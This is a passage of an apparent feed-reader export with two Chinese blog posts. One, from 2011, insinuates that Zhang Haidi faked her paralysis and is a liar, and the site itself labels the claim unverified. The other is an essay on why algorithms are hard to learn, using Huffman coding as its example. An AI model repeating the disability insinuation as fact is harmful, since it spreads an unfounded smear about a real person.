1983年，《中国青年报》发表关于张海迪的著名报告文学《是颗流星，就要把光留给人间》，获得广泛反响。之后，中国共产党决定将张海迪树立为宣传偶像。张海迪得到了两个赞誉：一个是“八十年代新雷锋”，一个是“当代保尔”。3月7日，中国共青团专门为其召开表彰大会，5月，中共中央发出《向张海迪同志学习的决定》，邓小平、叶剑英、李先念等领导人纷纷为其题词。邓小平亲笔题词：“学习张海迪，做有理想、有道德、有文化、守纪律的共产主义新人！”</p><p>或许　我们受 骗了</p><p> 张海迪以前是我的偶像。相信70后、80后都读过她故事。每当，我们受到挫 折的时候，我们就想到张海迪姐姐故事。她给了我们这些当年的小朋友无穷的力量。</p><p> 没想到造化弄人，前几天，网络爆料我们偶像之神永远的雷锋叔叔，居然是当时世界上最牛的大款时，我们的心灵破 碎了一次。</p><p> 今天网络居然又爆料张海迪居然翘起这么高的二郎腿？让我们极度怀疑张海迪是不是残疾人？高位截瘫怎么能做二郎腿？</p><p> 或许，我们受骗了，张海迪或许从来就没有残疾？短短的几天，我们的偶像就破碎了两个，你叫我怎么不心疼。天呀，原来，我们一直上当，我们一直受 骗。</p><p>网络披露了我们不知道的事情：</p><p> 张海迪2008年接替邓朴方，出任中国残联主席。两年前她在新浪微博开户，粉丝达63万。她曾信誓旦旦称：“残联工作者就应该是残疾人的亲人。（中国有）8,000多万残疾人，要改善他们的生活处境，真的是非常艰巨的任务，但是我要给自己信心和决心。”</p><p> 据香港媒体报导，近日有网民在微博上给她留言，希望山东籍的她能关注山东潍坊盲人律师。因为民 维 权，被当地政府非法 软 禁。留言给张海迪的人士，包括全国人大代表、山东烟台大学教授王全杰、北京人权律师江天勇等。王全杰更表明，若张海迪太忙，他可代表她整理资料，向上反映。</p><p> 不料，网民发现从6月28日起，张海迪的微博不能再跟帖评论，即留言功能已被她关闭。事件引起网民愤怒，狂轰张主席不义。网民对一个国家的残联主席，这样冷待她口口声声要服务的残疾人士，大表失望。网民说：“别忘了她是公众人物，由纳税人供养，她应有担当与良知，为百姓说话。”</p><p> 还有一件丑闻：张海迪在2001年两会上居然与其他三位联名上交提案，认为网吧产生的负 面影响大于其存在的积极作用，建议最终取消营业性电脑网吧！她在家时每天上网，外出时有时带笔记本电脑，却以堂皇的理由企图剥夺买不起电脑更买不起笔记本电脑的广大网民的上网自由！</p><p> 原来张海迪，从来就在撒谎？或许，她故事本来就是不存在？她不仅不诚实，而且对弱势群体具有冷 酷的心灵。</p><p>via <a href=\"http://blog.renren.com/blog/356986740/740417220\">link</a></p><p>本文不代表萝卜网观点，未经确证，仅供参考</p><p><strong>部分文章附有精彩小视频，如果您的阅读器无法观看视频，请移步原文链接：</strong> <a href=\"http://luo.bo/11381/\" title=\"张海迪的故事 或许我们都上当受骗了\">http://luo.bo/11381/</a></p> 本文小编：WooDragon 标题： <a href=\"http://luo.bo/11381/\" title=\"张海迪的故事 或许我们都上当受骗了\">张海迪的故事 或许我们都上当受骗了</a> <a href=\"http://luo.bo/11381/#comments\" title=\"to the comments\">网友评论</a> 发布时间：2011/07/19, 20:25 <br> <a href=\"http://luo.bo/\" title=\"萝卜网 - 人人都是艺术家\">萝卜网</a> Copyright ©   2010 - 2012 分享国内外精彩网事。<br> 更多精彩欢迎您订阅 <a href=\"http://feed.luobo8.com/\">http://feed.luobo8.com/</a>，欢迎网友<a href=\"http://luo.bo/delivery/\">投稿</a>、推荐文章。<br> <a href=\"http://luo.bo/8888/\"><font color=\"red\" size=\"4\">萝卜网官方论坛“第八区”公测进行中！</font></a><br><table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\"><tr><td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能对以下文章感兴趣：</font></b></td></tr><tr><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important\"> <a title=\"博海拾贝110718\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F11315%2F&amp;from=http%3A%2F%2Fluo.bo%2F11381%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2011/07/18/17970421.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">博海拾贝110718</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"博海拾贝110716\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F11225%2F&amp;from=http%3A%2F%2Fluo.bo%2F11381%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2011/07/16/17703842.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">博海拾贝110716</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"博海拾贝110713\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F11088%2F&amp;from=http%3A%2F%2Fluo.bo%2F11381%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2011/07/13/17279929.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">博海拾贝110713</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"博海拾贝110711\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F10998%2F&amp;from=http%3A%2F%2Fluo.bo%2F11381%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2011/07/11/17028883.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">博海拾贝110711</font> </a></td><td width=\"106\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a title=\"博海拾贝110715\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fluo.bo%2F11178%2F&amp;from=http%3A%2F%2Fluo.bo%2F11381%2F\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:100px!important;height:100px!important\" src=\"http://static.wumii.com/site_images/2011/07/15/17573925.jpg\" width=\"100px\" height=\"100px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:106px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">博海拾贝110715</font> </a></td></tr><tr><td colspan=\"5\" align=\"right\"> <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems.htm\" title=\"无觅相关文章插件\"> <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font> </a></td></tr></table><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/7sv1ooo89v8jfelhdjk8plpa64/300/250?ca=1&amp;fh=280#http%3A%2F%2Fluo.bo%2F11381%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/tamd?a=ss9OoMDqbD0:mlghohKDGV0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/tamd?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/tamd?a=ss9OoMDqbD0:mlghohKDGV0:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/tamd?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/tamd?a=ss9OoMDqbD0:mlghohKDGV0:-BTjWOF_DHI\"><img src=\"http://feeds.feedburner.com/~ff/tamd?i=ss9OoMDqbD0:mlghohKDGV0:-BTjWOF_DHI\" border=\"0\"></a>\n</div>"
    },
    "author" : "WooDragon",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/tamd",
      "title" : "萝卜网",
      "htmlUrl" : "http://luo.bo"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312027025831",
    "timestampUsec" : "1312027025831375",
    "id" : "tag:google.com,2005:reader/item/b03e4e867f7bd956",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "算法" ],
    "title" : "知其所以然（三）：为什么算法这么难？",
    "published" : 1310228672,
    "updated" : 1310228672,
    "alternate" : [ {
      "href" : "http://mindhacks.cn/2011/07/10/the-importance-of-knowing-why-part3/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><font color=\"#a5a5a5\">不知不觉《知其所以然》系列竟然也写到第三篇了，虽然前面两篇也说了不少，但是总觉得还有东西没有说“透”，或者说没有说“好”。所以这篇试图从不同的角度用更好的例子来继续深入阐述。（感谢<a href=\"http://www.douban.com/people/silwile/\">silwile</a>对本文的review和意见）</font></p>\n<hr>\n<p>广大码农同学们大多都有个共识，认为算法是个硬骨头，很难啃，悲剧的是啃完了还未必有用——除了面试的时候。实际工程中一般都是用现成的模块，一般只需了解算法的目的和时空复杂度即可。</p>\n<p>不过话说回来，面试的时候面算法，包括面项目中几乎不大可能用到的算法，其实并不能说是毫无道理的。<strong>算法往往是对学习和理解能力的一块试金石</strong>，难的都能掌握，往往容易的事情不在话下。志于高者得于中。反之则不成立。另一方面，虽说教科书算法大多数都是那些即便用到也是直接拿模块用的，但不幸的是，我们这群搬砖头的有时候还非得做些发明家的事情：要么是得把算法当白盒加以改进以满足手头的特定需求；要么干脆就是要发明轮子。所以，虽说面试的算法本身未必用得到，但熟悉各种算法的人通常更可能熟悉算法的思想，从而更可能具备这里说的两种能力。</p>\n<p>那么，为什么说算法很难呢？这个问题只有两种可能的原因：</p>\n<ol>\n<li>算法本身就很难。也就是说，算法这个东西对于人类的大脑来说本身就是个困难的事儿。 </li>\n<li>讲得太烂。 </li>\n</ol>\n<p>下面会说明，算法之所以被绝大多数人认为很难，以上两个原因兼具。</p>\n<p>我们说算法难的时候，有两种情况：<strong>一种是学算法难。第二种是设计算法难</strong>。对于前者，大多数人（至少我当年如此）学习算法几乎是在背算法，就跟背菜谱似的（“Cookbook”是深受广大码农喜爱的一类书），然而算法和菜谱的区别在于，算法包含的细节复杂度是菜谱的无数倍，算法的问题描述千变万化，逻辑过程百转千回，往往看得人愁肠百结，而相较之下任何菜谱涉及到的基本元素也就那么些（所以程序员肯定都具有成为好厨师的潜力:D）注意，即便你看了算法的证明，某种程度上还是“背”（为什么这么说，后面会详述）。我自己遇到新算法基本是会看证明的，但是发现没多久还是会忘掉，这是死记硬背的标准症状。如果你也啃过算法书，我相信很大可能性你会有同感：<em>为什么当时明明懂了，但没多久就忘掉了呢？为什么当时明明非常理解其证明，但没过多久想要自己去证明时却发现怎么都没法补上证明中缺失的一环呢？</em></p>\n<p>初中学习几何证明的时候，你会不会傻到去背一个定理的证明？不会。你只会背结论。为什么？一方面，因为证明过程包含大量的细节。另一方面，证明的过程环环相扣，往往只需要注意其中关键的一两步，便能够自行推导出来。算法逻辑描述就好比定理，算法的证明的过程就好比定理的证明过程。但不幸的是，与数学里面大量简洁的基本结论不同，算法这个“结论”可不是那么好背的，许多时候，<strong>算法本身的逻辑就几乎包含了与其证明过程等同的信息量</strong>，甚至算法逻辑本身就是证明过程（随便翻开一本经典的算法书，看几个经典的教科书算法，你会发现算法逻辑和算法证明的联系有多紧密）。于是我们又回到刚才那个问题：你会去背数学证明么？<strong>既然没人会傻到去背整个证明，又为什么要生硬地去背算法呢</strong>？</p>\n<p>那么，不背就不背，去理解算法的证明如何？理解了算法的证明过程，便更有可能记住算法的逻辑细节，理解记忆嘛。然而，仍然不幸的是，绝大多数算法书在这方面做的实在糟糕，证明倒是给全了，逻辑也倒是挺严谨的，可是似乎没有作者能真正还原算法发明者本身如何得到算法以及算法证明的思维过程，按理说，证明的过程应该反映了这个思维过程，但是在下文关于霍夫曼编码的例子中你会看到，其实饱受赞誉的<a href=\"http://www.amazon.com/Introduction-Algorithms-International-Thomas-Cormen/dp/0262533057\">CLRS</a>和<a href=\"http://www.amazon.com/Algorithms-Sanjoy-Dasgupta/dp/0073523402\">《Algorithms》</a><em>不仅没能还原这个过程，反而掩盖了这个过程</em>。</p>\n<p>必须说明的是，没有哪位作者是故意这样做的，但任何人在讲解一个自己已经理解了的东西的时候，往往会无意识地对自己的讲解进行“线性化”，例如证明题，如果你回忆一下高中做平面几何证明题的经历，就会意识到，其实证明的过程是一个充满了试错，联想，反推，特例，修改问题条件，穷举等等一干“非线性”思维的，混乱不堪的过程，而并不像写在课本上那样——引理1，引理2，定理1，定理2，一口气直到最终结论。这样的证明过程也许容易理解，但绝对不容易记忆。过几天你就会忘记其中一个或几个引理，其中的一步或几步关键的手法，然后当你想要回过头来自己试着去证明的时候，就会发现卡在某个关键的地方，为什么会这样？因为证明当中并没有告诉你为什么作者当时会想到证明算法需要那么一个引理或手法，所以，<strong>虽说看完证明之后，对算法这个结论而言你是知其所以然了，但对于算法的证明过程你却还没知其所以然</strong>。在我们大脑的记忆系统当中，<strong>新的知识必须要和既有的知识建立联系，才容易被回忆起来</strong>（<a href=\"http://mindhacks.cn/2009/03/28/effective-learning-and-memorization/\">《如何有效地学习与记忆》</a>）<strong>，联系越多，越容易回忆，而一个天外飞仙似地引理，和我们既有的知识没有半毛钱联系，没娘的孩子没人疼，自然容易被遗忘。</strong>（为什么还原思维过程如此困难呢？我曾经在<a href=\"http://mindhacks.cn/2008/07/07/the-importance-of-knowing-why/\">知其所以然（一）</a>里详述）</p>\n<p>正因为绝大多数算法书上悲剧的算法证明过程，很多人发现证明本身也不好记，于是宁可选择直接记结论。当年我在数学系，考试会考证明过程，但似乎计算机系的考试考算法证明过程就是荒谬的？作为“工程”性质的程序设计，似乎更注重使用和结果。但是如果是你需要在项目中自己设计一个算法呢？这种时候最起码需要做的就是证明算法的正确性吧。我们面试的时候往往都会遇到一些算法设计问题，我总是会让应聘者去证明算法的正确性，因为即便是<b>一个“看上去”正确的算法，真正需要证明起来往往发现并不是那么容易</b>。</p>\n<p>所以说，绝大多数算法书在作为培养算法设计者的角度来说是失败的，比数学教育更失败。大多数人学完了初中平面几何都会做证明题（数学书不会要求你记住几何所有的定理），但很多人看完了一本算法书还是一团浆糊，不会证明一些起码的算法，我们背了一坨又一坨结论，非但这些结论许多根本用不上，就连用上的那些也不会证明。为什么会出现这样的差异？因为数学教育的理想目的是为了让你成为能够发现新定理的科学家，而码农系的算法教育的目的却更现实，是为了让你成为能够使用算法做事情的工程师。然而，事情真的如此简单么？如果真是这样的话干脆连算法结论都不要背了，只要知道算法做的是什么事情，时空复杂度各是多少即可。</p>\n<p>如果说以上提到的算法难度（讲解和记忆的难度）属于<a href=\"http://en.wikipedia.org/wiki/Accidental_complexity\">Accidental Complexity</a>的话，算法的另一个难处便是Essential Complexity了：算法设计。还是拿数学证明来类比（如果你看过《Introduction to Algorithms：A Creative Approach》就知道算法和数学证明是多么类似。），与单单只需证明相比，<strong>设计算法的难处在于，定理和证明都需要你去探索，尤其是前者</strong>——你需要去自行发现关键的那（几）个定理，跟证明已知结论相比（已经确定知道结论是正确的了，你只需要用逻辑来连接结论和条件），<strong>这件事情的复杂度往往又难上一个数量级。</strong></p>\n<p>一个有趣的事实是，<b>算法的探索过程往往蕴含算法的证明过程</b>，理想的算法书应该通过还原算法的探索过程，从而让读者不仅能够自行推导出证明过程，同时还能够具备探索新算法的能力。之所以这么说，皆因为我是个懒人，懒人总梦想学点东西能够实现以下两个目的：</p>\n<ol>\n<li><strong>一劳永逸</strong>：程序员都知道“<a href=\"http://en.wikipedia.org/wiki/Write_once,_run_anywhere\">一次编写到处运行</a>”的好处，多省事啊。学了就忘，忘了又得学，翻来覆去浪费生命。为什么不能看了一遍就再也不会忘掉呢？到底是教的不好，还是学得不好？ </li>\n<li><strong>事半功倍</strong>：事实上，程序员不仅讲究一次编写到处运行，更讲究“一次编写到处使用”（也就是俗称的“复用”）。如果学一个算法所得到的经验可以到处使用，学一当十，推而广之，时间的利用效率便会大大提高。究竟怎样学习，才能够使得经验的外推（extrapolate）效率达到最大呢？ </li>\n</ol>\n<p>想要做到这两点就必须<b>尽量从知识树的“根节点”入手</b>，虽然这是一个美梦，例如数学界寻找“根节点”的<a href=\"http://mindhacks.cn/2008/04/18/learning-from-polya/\">美梦由来已久</a>（《跟波利亚学解题》的“一点历史”小节），但哥德尔一个证明就<a href=\"http://mindhacks.cn/2006/10/15/cantor-godel-turing-an-eternal-golden-diagonal/\">让美梦成了泡影</a>（《永恒的金色对角线》））；但是，这并不阻止我们去寻找更高层的节点——<a href=\"http://mindhacks.cn/2008/04/18/learning-from-polya/\">更具普适性的解题原则和方法</a>。所以，理想的算法书或者算法讲解应该是从最具一般性的思维法则开始，顺理成章地推导出算法，这个过程应该尽量还原一个”普通人“思考的过程，而不是让人看了之后觉得”这怎么可能想到呢？</p>\n<p>以本文上篇提到的霍夫曼编码为例，第一遍看霍夫曼编码的时候是在本科，只看了算法描述，觉得挺直观的，过了两年，忘了，因为不知道为什么要把两个节点的频率加在一起看做单个节点——一件事情不知道“为什么”就会记不牢，知道了“为什么”的话便给这件事情提供了必然性。不知道“为什么”这件事情便可此可彼，<b>我们的大脑对于可此可彼的事情经常会弄混，它更容易记住有理有据的事情</b>（<em>从信息论的角度来说，一件必然的事情概率为1，信息量为0，而一件可此可彼的事情信息量则是大于0的</em>）。第二遍看是在工作之后，终于知道要看证明了，拿出著名的《Algorithms》来看，边看边点头，觉得讲得真好，一看就理解了为什么要那样来构造最优编码树。可是没多久，又给忘了！这次忘了倒不是忘了要把两个节点的频率加起来算一个，而是忘了为什么要这么做，因为当时没有弄清霍夫曼为什么能够想到为什么应该那样来构造最优编码树。结果<em>只知其一不知其二</em>。</p>\n<p>必须说明的是，如果只关心算法的结论（即算法逻辑），那么理解算法的证明就够了，光背算法逻辑难记住，理解了证明会容易记忆得多。但如果也想不忘算法的证明，那么不仅要理解证明，还要理解证明背后的思维，也就是<em>为什么背后的为什么</em>。后者一般很难在书和资料上找到，唯有自己多加揣摩。为什么要费这个神？只要不会忘记结论不就结了吗？取决于你想做什么，如果你想真正弄清算法设计背后的思想，不去揣摩算法原作者是怎么想出来的是不行的。</p>\n<p>回到霍夫曼编码问题，我们首先看一看《Algorithms》上是怎么讲的：</p>\n<p>首先它给出了一棵编码树的cost function：</p>\n<p>cost of tree = Σ freq(i) * depth(i)</p>\n<p>这个cost function很直白，就是把编码的定义复述了一遍。但是接下来就说了：</p>\n<p><em>There is another way to write this cost function that is very helpful.</em> Although we are only given frequencies for the leaves, we can define the frequency of any internal node to be the sum of the frequencies of its descendant leaves; this is, after all, the number of times the internal node is visited during encoding or decoding…</p>\n<p>接着就按照这个思路把cost function转换了一下：</p>\n<p>The cost of a tree is the sum of the frequencies of all leaves and internal nodes, except the root.</p>\n<p>然后就开始得出算法逻辑了：</p>\n<p>The <em>first formulation</em> of the cost function tells us that the <em>two symbols with the smallest frequencies must be at the bottom of the optimal tree</em>, as children of the lowest internal node (this internal node has two children since the tree is full). Otherwise, swapping these two symbols with whatever is lowest in the tree would improve the encoding.</p>\n<p>This suggests that we start constructing the tree greedily: find the two symbols with the smallest frequencies, say i and j, and make them children of a new node, which then has frequency fi + fj. To keep the notation simple, let’s just assume these are f1 and f2. By the <em>second formulation</em> of the cost function, any tree in which f1 and f2 are sibling-leaves has cost f1 + f2 plus the cost for a tree with n – 1 leaves of frequencies (f1 + f2), f3, f4, .., fn. <em>The latter problem is just a smaller version of the one we started with</em>.</p>\n<p>读到这里我想大多数人有两种反应：</p>\n<ol>\n<li>觉得理所当然。 </li>\n<li>觉得恍然大悟。 </li>\n</ol>\n<p>因为我当时也是这么觉得的。可是后来当我发现自己无法从头证明一遍的时候，我知道肯定是理解的不够深刻。如果理解的够深刻，那么基本上是不会忘掉的。</p>\n<p>如果看完霍夫曼编码这样一个简短证明你觉得顺理成章，一切都挺显然，<em>那就坏了</em>，即便是看上去最基本的性质也往往实际上没那么显然。“逢山开路，遇水架桥”在我们今天看来是无比显然的事实，但是试想在没有桥的远古时代，一个原始人走到一条湍急的河流前，他会怎么想，他又能有什么法子呢？这是个他从来没有遇见过的问题。如果后来有一天，他路过另外一条小溪，看到小溪上有一截被闪电劈断的枯树，于是他踏着树干走过了小溪，并意识到“树横过河面”可以达到“过河”这个目的，这就将条件和目的建立了直接的联系（事实上，是自然界展示了这个联系，我们的原始人只是记住了这个联系）。后来他又路过那条河流，他寻思如何达到“过河”这个目的的时候，忽然意识到在他的记忆中已经遇到过需要达成同样目的的时候了，那个时候的条件是“树横过河面”，于是问题便归结为如何满足这个“树横过河面”的条件，而后一个问题就简单多了。（事实上波利亚在他的著作《How to Solve it》中举的正是这么个例子）</p>\n<p>为什么那么多的算法书，就看不到有一本讲得好的？因为我们求解问题过程中的思维步骤太容易被自己当作“显然”的了，但除了我们天生就会的认知模式（联系，类比），没有什么是应该觉得显然的，试错是我们天生就会的思维法则么？是的，但是可供尝试的方案究竟又是怎么来的呢？就拿上面的例子来说，一个从没有见过枯树干架在小溪上的原始人，怎么知道用树架桥是一种可选的方案呢？俗话说巧妇难为无米之炊啊。我们大脑的神经系统会的是将目的和条件联系起来，第一次原始人遇到小溪过不去，大脑中留下了一个未实现的目的，后来见到小溪上的树干，忽然意识到树干是实现这个目的的条件，两者便联系起来了，因此问题就规约为如何架树干了。</p>\n<p>回到《Algorithms》中的证明上，这个看似简洁明了的证明其实有几处非常不显然的地方，甚至不严谨的地方，这些地方也正是你过段时间之后试图自己证明的话会发现卡住的地方：</p>\n<ol>\n<li>作者轻飘飘地就给出了cost function的另外一种关键的描述，而对于如何发现这种描述却只是一语带过：&quot;<em>There is another way to write this cost function that is very helpful.. </em>we can define the frequency of any internal node to be the sum of the frequencies of its descendant leaves“这其实就是我常常痛恨的“<em>我们考虑</em>…”，这里作者其实就是在说”让<em>我们考虑</em>下面这样一种<em>奇妙</em>的转换“，可是怎么来的却不说。但必须承认，《Algorithms》的作者还是算厚道的，因为后面他又稍微解释了一下：“this is, after all, the number of times the internal node is visited during encoding or decoding…”这个解释就有点让人恍然大悟了，但是千万别忘了，这种恍然大悟是一种错觉，你还是没明白为什么他会想到这一点。这就像是作者对你说“<em>仔细观察</em>问题条件，我们<em>容易发现</em>这样一种奇妙的性质..”，怎么个“仔细”法？凭什么我自己“观察”半天就是发现不了呢？霍夫曼本人难道也是死死盯着问题<a href=\"http://en.wikipedia.org/wiki/Huffman_tree#History\">“观察”了一学期</a>然后就“发现”了么？我们有理由相信霍夫曼肯定尝试了各种各样的方法，作出了各种各样的努力，否则当年Shannon都没搞定的这个问题花了他一学期，难道他在这个学期里面大脑就一片空白（或者所有的尝试全都是完全不相干的徒劳），然后到学期末尾忽然“灵光一现”吗？ </li>\n<li>如果“仔细观察”:)，我们会发现两个cost function表达中frequency的概念有微妙的差异，在第一个cost function中，只有叶子节点有frequency，而这个frequency必须和叶子节点的深度相乘。而在第二个cost function中，内部节点也具有了frequency，可是所有节点的“frequency”忽然全都不跟深度相乘了。frequency的不同含义令人困惑。 </li>\n<li>作者提到：第一个cost function告诉我们频率最低的两个节点必然处于最优编码树的底端，作为最低内部节点的两个子节点。这是一个不严谨的说法，从前文给出的条件和性质，只能推导出编码树的最底层必然能找到频率最低的两个节点，但<em>它们未必一定要是兄弟节点</em>，如果树的最底层不止能容纳两个节点的话它们就可以有不同的父节点。“我们不妨考虑”这样一个例子：对A,B,C,D四个字母进行编码，假设它们的频率分别是1， 1， 2， 2。这个时候我们可以构造如下图所示的两棵树，两棵树的cost都是12，都是最优的。但其中一棵树中，两个频率最低的节点并非兄弟。       <br><a href=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree2.jpg\"><img style=\"background-image:none;border-right-width:0px;margin:5px 0px 10px;padding-left:0px;padding-right:0px;display:inline;border-top-width:0px;border-bottom-width:0px;border-left-width:0px;padding-top:0px\" title=\"tree2\" border=\"0\" alt=\"tree2\" src=\"http://mindhacks.cn/wp-content/uploads/2011/07/tree2_thumb.jpg\" width=\"434\" height=\"246\"></a> </li>\n</ol>\n<p>为什么要提到上面这几点不显然和不严谨的地方，因为只要当你看到算法书上出现不显然和不严谨的地方，基本上就意味着作者其实跳过了关键的思维步骤。</p>\n<p>不幸的是《Algorithms》这本书里面讲霍夫曼编码已经算是讲的好的了，如果你翻开著名的CLRS，看一看当中是怎么证明的，你就知道我说的什么意思了。有时候这些证明是如此的企图追求formal和严谨，一上来就定义符号一大摞，让人看了就想吐。</p>\n<p>说了这么多，<em>有没有可能把霍夫曼编码讲的更好呢</em>？前面说过，霍夫曼编码我记了又忘，忘了又记，好几次了，有一次终于烦了，心想如果要自己去证明，会怎么去证，那个时候我已经忘了《Algorithms》里面怎么讲的了。所以我得从头来起，首先，对于算法问题，有一个一般性原则是，<strong>先看一看解空间的构成</strong>。尤其是对于搜索问题（最优化问题可以看做搜索问题的一个特例），这一点尤其重要。霍夫曼编码的可能的编码树是有穷的，如果穷举所有的编码树，然后找到那棵代价最小的，这种方法至少是可行的，有了可行的方法（即便是穷举）至少让我们内心感到踏实。</p>\n<p>接下来便是提高搜寻效率的问题。而提高搜寻效率的关键（同样也是一个一般性原则），便是<strong>尽量去寻找问题条件能够推导出来的性质，</strong><strong>然后利用这些性质去避免不必要的搜寻</strong>，只要你学过二分搜索就应该理解这个一般性原则：二分搜索的效率之所以高于“穷搜”（O(n)），便是因为它利用了问题中的性质（有序）来避免了不必要的搜寻。有时候这个性质甚至可以直接将时间降为O(1)，例如在一个有序数组中寻找出现次数大于n/2的数（假设该数存在），利用“该数一定出现在数组正中间”这个性质，我们直接就避免了所有的计算。</p>\n<p>不过，话虽如此，有时候这些性质并不是那么“显然”的，需要对问题进行深入的折腾才能有可能发现。第三个一般原则：如果你要搜寻的元素是某个满足特定条件的元素（例如寻找最优解的时候，“最优”的定义就是这个“特定条件”），那么可以“<strong>倒过来推</strong>”（数学证明常用手法，结论当条件使），即假设你已经找到了你要找的元素，那么能得出哪些结论，每一个结论都是最优解的一个必要条件，而<em>每一个必要条件都能够帮助你避免不必要的搜寻</em>，因为你<em>只要发现某个候选解不满足某个必要条件，就可以立即将其丢弃</em>，前面提到的寻找出现次数大于n/2的例子是一个极端情况，我们得出的必要条件导致我们可以直接丢弃除中点元素之外的一切其他元素，再例如如果有人叫你寻找有序数组中最小元素，你会毫不犹豫地把该数组头尾元素中较小的那个给他，因为你知道“如果那个最小元素存在，那么它<em>必然</em>位于头尾”——这个必要条件直接允许你丢弃掉n-2个候选解。</p>\n<p>回到霍夫曼编码问题，按照这个原则，我们会去<em>假设已经得到了最优编码树</em>，那么我们能够发现关于它的什么性质呢？这里又要提到另一个适用于很多最优化问题的原则（前面提到的原则适用于一般性搜索问题），<strong>所谓最优解，就是说比其他所有解都要更好</strong>，虽然这句话听上去像是废话，但是它的一个直接推论——<strong>比与它邻近的所有候选解都要好</strong>——就是一个非常有用的，不是废话的性质了。学过微积分的都知道，光滑函数的最值点必然是大（小）于其邻域内的所有点的，然后再根据这个就自然推出该点的一阶导数（切线斜率）必然为0的性质，这个性质（必要条件）让我们直接省掉了去整个区间内搜索的麻烦，从而可以直接锁定有限几个候选解。那么，既然我们说最优霍夫曼树一定比它“附近”的树更好，我们就想看看，怎么来找到它附近的树。我们知道要从一个点到它附近，往往是对这个点进行一些调整，例如N+1是到达附近的另一个整数。霍夫曼树是一棵树，所以对这棵树的所有的一次“改动”（或“折腾”）都能够到达与它的“改动”距离为1的点（是不是想起“编辑距离”这个概念），怎么改动呢？最符合直觉的（虽然并不是唯一的）改动便是把叶子节点进行互换。</p>\n<p>于是我们得到一个重要的推论：</p>\n<ul>\n<li><em>在最优霍夫曼树中，无论互换哪两个叶子节点，得到的树都变得更“差”。（严格来说是不会变得更“好”，因为最优树未必唯一）</em> </li>\n</ul>\n<p>这个性质看上去有点像废话，值得费这么多事么？值得。因为虽然前文说了很多，但都是大多数人大脑里面既有的，一般性的法则，前面说过，如果我们能够从我们已经掌握的一般法则出发来推导出问题的解，那么记忆负担是最小的，因为这里面用到的所有法则我们都很清楚，也知道怎么一步步往下走。</p>\n<p>上面这个性质究竟意味着什么呢？如果你假设这两个叶子节点的频率为f1和f2，深度为d1和d2，互换它们的时候，其他叶子节点的cost保持不变，令为常量C，那么互换前总cost为C+f1d1+f2d2，互换后为C+f1d2+f2d1，既然互换之后的树一定更”差“那么就是说f1d1+f2d2 &lt; f1d2 + 